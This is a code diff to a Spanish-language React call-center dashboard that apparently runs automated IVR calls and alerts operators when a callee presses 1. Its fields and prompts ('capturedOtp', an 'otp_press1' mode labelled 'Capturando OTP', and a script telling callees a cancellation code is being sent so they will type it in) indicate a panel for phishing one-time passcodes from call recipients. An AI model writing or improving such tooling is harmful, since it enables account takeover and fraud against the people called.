@@ -301,7 +301,9 @@ export default function App() {
       : [];
     const params = new URLSearchParams();
     if (activeU?.tenantId) params.set('tenantId', activeU.tenantId);
-    if (assignedExts.length > 0) params.set('extensions', assignedExts.join(','));
+    if (activeU?.role !== 'admin' && assignedExts.length > 0) {
+      params.set('extensions', assignedExts.join(','));
+    }
     const qs = params.toString();
     return {
       activeU,
@@ -327,7 +329,7 @@ export default function App() {
       if (callsRes.ok) {
         const data = await callsRes.json();
         if (data.success && Array.isArray(data.calls)) {
-          const callsSig = data.calls.map((c: any) => `${c.id}:${c.status}:${c.agent}:${c.isOnHold}:${c.otpStatus || ''}:${c.capturedOtp || ''}`).join('|');
+          const callsSig = data.calls.map((c: any) => `${c.id}:${c.status}:${c.agent}:${c.isOnHold}:${c.digit || ''}:${c.pressed1At || ''}:${c.otpStatus || ''}:${c.capturedOtp || ''}`).join('|');
           const running = data.calls.filter((c: any) => c.status !== 'ended').length;
           // Only trigger full state re-render if call list/status changed OR calls are active (duration tick)
           if (callsSig !== lastLiveCallsSigRef.current || running > 0) {
@@ -335,18 +337,30 @@ export default function App() {
             setGlobalLiveCalls(data.calls);
             setGlobalLiveCallsUpdatedAt(Date.now());
           }
-          const cancelPress1Calls = data.calls.filter(
-            (c: any) => c.status === 'pressed_1' && c.mode === 'cancel_code' && !c.capturedOtp
+          const press1Calls = data.calls.filter(
+            (c: any) =>
+              c.status !== 'ended' &&
+              c.status !== 'machine' &&
+              c.status !== 'machine_detected' &&
+              !c.capturedOtp &&
+              (c.status === 'pressed_1' ||
+                (c.digit === '1' &&
+                  !!c.pressed1At &&
+                  c.status !== 'asking_cancel_code' &&
+                  c.status !== 'cancel_valid' &&
+                  c.status !== 'cancel_invalid' &&
+                  c.status !== 'otp_valid' &&
+                  c.status !== 'otp_invalid'))
           );
-          let hasNewCancelPress1 = false;
-          cancelPress1Calls.forEach((c: any) => {
-            const key = `${c.id || c.number}_press1_cancel`;
+          let hasNewPress1 = false;
+          press1Calls.forEach((c: any) => {
+            const key = `${c.id || c.number}_${c.pressed1At || c.startTime || ''}_press1`;
             if (!seenGlobalCancelPress1Ref.current.has(key)) {
               seenGlobalCancelPress1Ref.current.add(key);
-              hasNewCancelPress1 = true;
+              hasNewPress1 = true;
             }
           });
-          if (hasNewCancelPress1) {
+          if (hasNewPress1) {
             playGlobalCancelPress1Chime();
           }
           setActiveCallCount((prev) => (prev === running ? prev : running));
@@ -360,10 +374,12 @@ export default function App() {
           if (activeU?.tenantId) {
             recs = recs.filter((r: any) => !r.tenantId || r.tenantId === activeU.tenantId);
           }
-          if (assignedExts.length > 0) {
+          if (activeU?.role !== 'admin' && assignedExts.length > 0) {
             recs = recs.filter((r: any) => {
               const recAgent = r.agent ? String(r.agent).trim() : '';
-              if (recAgent) return assignedExts.includes(recAgent);
+              if (recAgent) {
+                return recAgent.split('&').some((ext: string) => assignedExts.includes(ext.trim()));
+              }
               const recNum = r.number ? String(r.number).trim() : '';
               return recNum ? assignedExts.includes(recNum) : false;
             });
@@ -2420,18 +2436,27 @@ export default function App() {
       </main>
       </div>
 
-      {/* Floating Press-1 Cancel Code Alert Banner across non-production/non-live tabs */}
+      {/* Floating Press-1 Alert Banner across non-production/non-live tabs (ALL IVR modes) */}
       {(() => {
         if (isMembershipLocked || activeTab === 'production' || activeTab === 'live-calls') return null;
-        const pendingCancelCall = globalLiveCalls.find(
-          (c: any) =>
-            c.status === 'pressed_1' &&
-            c.mode === 'cancel_code' &&
-            !c.capturedOtp &&
-            !dismissedCancelPress1Keys.includes(`${c.id || c.number}_press1_cancel`)
-        );
-        if (!pendingCancelCall) return null;
-        const cancelKey = `${pendingCancelCall.id || pendingCancelCall.number}_press1_cancel`;
+        const pendingPress1Call = globalLiveCalls.find((c: any) => {
+          const isAlive = c.status !== 'ended' && c.status !== 'machine' && c.status !== 'machine_detected';
+          const isPress1 =
+            c.status === 'pressed_1' ||
+            (c.digit === '1' &&
+              !!c.pressed1At &&
+              c.status !== 'asking_cancel_code' &&
+              c.status !== 'cancel_valid' &&
+              c.status !== 'cancel_invalid' &&
+              c.status !== 'otp_valid' &&
+              c.status !== 'otp_invalid');
+          const key = `${c.id || c.number}_${c.pressed1At || c.startTime || ''}_press1`;
+          return isAlive && isPress1 && !c.capturedOtp && !dismissedCancelPress1Keys.includes(key);
+        });
+        if (!pendingPress1Call) return null;
+        const press1Key = `${pendingPress1Call.id || pendingPress1Call.number}_${pendingPress1Call.pressed1At || pendingPress1Call.startTime || ''}_press1`;
+        const isCancelMode = pendingPress1Call.mode === 'cancel_code';
+        const isOtpVerifyMode = pendingPress1Call.mode === 'otp_press1';
         return (
           <div
             className={`fixed right-6 z-50 max-w-sm w-full bg-slate-950 border-2 border-amber-400 rounded-2xl p-4 shadow-2xl shadow-amber-500/30 text-white ${
@@ -2442,11 +2467,15 @@ export default function App() {
               <div className="flex items-center gap-2">
                 <BellRing className="w-4 h-4 text-amber-400 animate-bounce" />
                 <span className="text-xs font-black uppercase tracking-wider text-amber-300">
-                  ¡Cliente Marcó 1! — Envía Código
+                  {isCancelMode
+                    ? '¡Cliente Marcó 1! — Envía Código'
+                    : isOtpVerifyMode
+                    ? '¡Cliente Marcó 1! — Capturando OTP'
+                    : '¡Cliente Marcó 1! — En Línea'}
                 </span>
               </div>
               <button
-                onClick={() => setDismissedCancelPress1Keys((prev) => [...prev, cancelKey])}
+                onClick={() => setDismissedCancelPress1Keys((prev) => [...prev, press1Key])}
                 className="p-1 rounded-md text-slate-400 hover:text-white hover:bg-slate-800 cursor-pointer"
                 title="Cerrar aviso"
               >
@@ -2454,32 +2483,50 @@ export default function App() {
               </button>
             </div>
 
-            <div className="mb-3">
-              <div className="text-[11px] text-slate-400">Número esperando en línea:</div>
-              <div className="text-sm font-mono font-black text-white">{pendingCancelCall.number}</div>
-              <p className="text-[11px] text-amber-200/90 mt-1 leading-snug">
-                El cliente escuchó: <em>&quot;Un momento por favor, le estamos enviando un código de cancelación&quot;</em>. Envíale el código y pulsa el botón para que lo digite:
-              </p>
+            <div className="mb-3 flex items-start gap-3">
+              <div className="w-11 h-11 rounded-xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shrink-0 shadow-md shadow-amber-400/40">
+                <span className="text-xl leading-none">1</span>
+                <span className="text-[8px] uppercase font-extrabold">DTMF</span>
+              </div>
+              <div className="min-w-0">
+                <div className="text-[11px] text-slate-400">Cliente presionó la tecla 1:</div>
+                <div className="text-sm font-mono font-black text-white">{pendingPress1Call.number}</div>
+                <p className="text-[11px] text-amber-200/90 mt-1 leading-snug">
+                  {isCancelMode ? (
+                    <>
+                      El cliente escuchó: <em>&quot;Un momento por favor, le estamos enviando un código de cancelación&quot;</em>. Envíale el código y pulsa el botón para que lo digite:
+                    </>
+                  ) : isOtpVerifyMode ? (
+                    'El cliente marcó 1 en el IVR y el sistema le está solicitando su código de verificación.'
+                  ) : (
+                    <>
+                      Transfiriendo / timbrando en tu extensión (<strong>{pendingPress1Call.agentName || `Ext. ${pendingPress1Call.agent || 'Ring-All'}`}</strong>).
+                    </>
+                  )}
+                </p>
+              </div>
             </div>
 
             <div className="space-y-2">
-              <button
-                type="button"
-                disabled={sendingCancelBannerNum === pendingCancelCall.number}
-                onClick={() => handleGlobalCancelCodeSent(pendingCancelCall.number, pendingCancelCall.agent)}
-                className="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all cursor-pointer shadow-md shadow-emerald-500/25 disabled:opacity-50"
-              >
-                <Send className="w-3.5 h-3.5" />
-                <span>
-                  {sendingCancelBannerNum === pendingCancelCall.number
-                    ? 'Activando...'
-                    : 'Ya Envié el Código → Pedir que Digite'}
-                </span>
-              </button>
+              {isCancelMode && (
+                <button
+                  type="button"
+                  disabled={sendingCancelBannerNum === pendingPress1Call.number}
+                  onClick={() => handleGlobalCancelCodeSent(pendingPress1Call.number, pendingPress1Call.agent)}
+                  className="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all cursor-pointer shadow-md shadow-emerald-500/25 disabled:opacity-50"
+                >
+                  <Send className="w-3.5 h-3.5" />
+                  <span>
+                    {sendingCancelBannerNum === pendingPress1Call.number
+                      ? 'Activando...'
+                      : 'Ya Envié el Código → Pedir que Digite'}
+                  </span>
+                </button>
+              )}
               <button
                 type="button"
                 onClick={() => setActiveTab('production')}
-                className="w-full flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold text-xs transition-all cursor-pointer"
+                className="w-full flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold text-xs transition-all cursor-pointer"
               >
                 <PhoneCall className="w-3.5 h-3.5 text-amber-400" />
                 <span>Ir al Centro de Llamadas</span>
